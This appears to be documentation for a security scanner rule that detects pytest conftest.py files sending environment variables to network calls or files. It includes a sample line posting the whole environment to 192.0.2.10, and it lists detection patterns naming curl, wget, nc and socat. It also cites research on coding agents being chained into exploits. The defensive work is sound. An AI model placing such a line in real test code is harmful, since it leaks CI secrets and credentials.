# AAK-STARTUP-HOOK-CONFTEST-001

**conftest.py sends the environment to a network call or a file**

| Field | Value |
|---|---|
| Severity | HIGH (a network call), MEDIUM (a file write) |
| Category | `SUPPLY_CHAIN` |
| Shipped | v0.6.37 |
| Scanner | `agent_audit_kit/scanners/startup_hooks.py` |
| OWASP Agentic | ASI04 (Agentic Supply Chain Vulnerabilities), ASI05 (Unexpected Code Execution) |
| Research | [arXiv:2611.19764](https://arxiv.org/abs/2611.19764), Compositional Exploits in Autonomous Coding Agents (15 Nov 2026) |

## What it catches

pytest imports every `conftest.py` under its rootdir and the test paths before
the first test runs. The process holds the environment of whatever started it:
CI secrets, cloud credentials, AI API keys. So `pytest`, `make test`, a
pre-commit hook and a coding agent asked to run the tests all run what a
conftest.py holds, and whoever can add or change one, in a pull request or as an
agent writing tests, runs code with those secrets on the next test run.

The rule reports a conftest.py that hands the environment to a network call or
to a file:

```python
import json
import os
import urllib.request

urllib.request.urlopen("http://192.0.2.10:8080/c", data=json.dumps(dict(os.environ)).encode())
```

```
AAK-STARTUP-HOOK-CONFTEST-001  HIGH  tests/conftest.py:6
Line 6 sends the environment, read whole on line 6, to a network call
(`urllib.request.urlopen`): ...
```

A fixture that reads the one setting it needs is not reported:

```python
import os

import pytest


@pytest.fixture
def database_url():
    return os.environ.get("DATABASE_URL")
```

The arXiv paper above measured coding agents chaining individually harmless
tools through shared workspace files and environment variables into exploits
72.9% to 84.5% of the time against unprotected models, with five single-tool
scanners detecting none. A conftest.py that a later test run imports is one
link of such a chain.

## What it reads

The file is parsed, never imported or run.

- **Source**: the environment read whole (`os.environ` iterated, copied with
  `.items()`, `.keys()`, `.values()`, `.copy()`, `dict()` or `{**os.environ}`,
  put in an f-string or passed whole to a call), or one variable named like a
  secret (`*_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`) read by a literal name
  through `os.environ[...]`, `os.environ.get` or `os.getenv`. `from os import
  environ` and `import os as o` are read too.
- **Sink**: a urllib, http.client, socket, requests, httpx or aiohttp call, a
  method of a client one of them built and bound to a name, curl, wget, nc,
  ncat or socat run by `subprocess`, `os.system` or `os.popen`, or a write to a
  file opened for writing (`open(..., "w")` and its `a`, `x` and `+` modes,
  `Path.write_text`, `Path.write_bytes`, `print(file=...)`, `json.dump`).
- **Flow**: one hop inside the file. The source sits inside the sink's
  arguments, or a name bound from it by an assignment, a loop or a
  comprehension does.

A network sink is reported HIGH and a file write MEDIUM, one finding per file,
on the line of the first network sink a flow reaches, else the first file write.
The evidence names the line the environment is read on, the variables read by
name, and the name the flow goes through.

## What it does not catch

- Only files named `conftest.py` are read. A module a `pytest_plugins` line
  names, `noxfile.py`, `tox.ini` commands and `package.json` test scripts are
  not. `node_modules`, `.venv` and AAK's other skip directories are not walked.
- A variable named otherwise (`DATABASE_URL`), or a name built at run time.
- A flow of two hops or more, through an attribute, a function's return value
  or another file. A bound name counts wherever it is read in the file, whatever
  function binds it.
- For a subprocess only the command and `input=` are read: a child given
  `env={**os.environ}` is not a flow, and neither a command held in a variable
  nor a variable the shell expands itself (`env | curl -d @- ...`) is seen.
- Printing or logging the environment.
- `__import__`, `importlib`, `getattr`, and `exec` or `eval` of a string.
- Where a request goes: a fixture that authenticates to the service it tests
  with a `*_TOKEN` variable is reported like one that sends it elsewhere.
- A file that does not parse, or that holds neither `environ` nor `getenv`. A
  conftest.py over 1 MB is refused, which marks the scan incomplete.

## How to fix

Read the conftest.py diff in every pull request that touches one, as you would
a CI workflow, and review the conftest.py files an agent writes before you run
the tests. A fixture needs the variables it names, read one by one, never the
whole environment. Run tests in CI with only the secrets that job needs, never
deploy or publish tokens. If the code is not yours, remove it and rotate every
credential the test runs could reach.
